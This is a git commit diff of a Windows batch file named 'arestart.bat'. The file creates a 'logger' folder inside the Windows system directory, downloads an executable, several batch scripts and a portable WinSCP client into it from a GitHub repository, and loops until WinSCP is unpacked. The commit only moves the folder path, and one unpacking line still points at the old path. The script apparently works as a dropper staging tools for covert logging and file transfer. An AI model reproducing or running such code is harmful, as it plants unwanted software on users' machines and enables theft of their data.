26e415e31c5b7b03a146166988504a9a42981478
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 04:29:06 -0700

    Update arestart.bat

--- arestart.bat
+++ arestart.bat
@@ -1,15 +1,15 @@
 @echo off
-mkdir C:\Windows\System32\logger
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System32\logger\accgen.exe
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System32\logger\define.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System32\logger\ss.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System32\logger\ss1.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System32\logger\gen.bat
+mkdir C:\Windows\System\logger
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System\logger\accgen.exe
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System\logger\define.bat
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System\logger\ss.bat
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\logger\ss1.bat
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\logger\gen.bat
 :scp
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System32\logger\scp.zip
-powershell Expand-Archive C:\Windows\System32\logger\scp.zip -DestinationPath C:\Windows\System32\logger\
-if exist "C:\Windows\System32\logger\WinSCP.com" if exist "C:\Windows\System32\logger\WinSCP.exe" goto exit
-if not exist "C:\Windows\System32\logger\WinSCP.com" goto scp
-if not exist "C:\Windows\System32\logger\WinSCP.exe" goto scp
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
+powershell Expand-Archive C:\Windows\System32\logger\scp.zip -DestinationPath C:\Windows\System\logger\
+if exist "C:\Windows\System\logger\WinSCP.com" if exist "C:\Windows\System\logger\WinSCP.exe" goto exit
+if not exist "C:\Windows\System\logger\WinSCP.com" goto scp
+if not exist "C:\Windows\System\logger\WinSCP.exe" goto scp
 :exit
 exit
